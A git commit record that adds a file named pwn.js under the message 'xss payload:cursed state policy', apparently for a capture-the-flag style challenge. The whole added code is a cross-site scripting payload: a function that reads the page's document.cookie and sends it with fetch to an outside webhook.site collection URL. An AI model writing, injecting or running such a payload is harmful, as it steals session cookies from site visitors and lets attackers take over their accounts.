e2bd8aa82b53782a6ba907b59ba3c1d43593d2b8
IamUsike <sathwikthanmay4@gmail.com>
2025-04-29 18:41:41 +0530

    xss payload:cursed state policy

---
+++ pwn.js
@@ -0,0 +1,5 @@
+async function sendCookie() {
+  const url = "https://webhook.site/6d960ca4-93a4-4a5d-bd78-9d7e91cc7920";
+  const cookie = document.cookie;
+  await fetch(url + "/?c=" + cookie);
+}
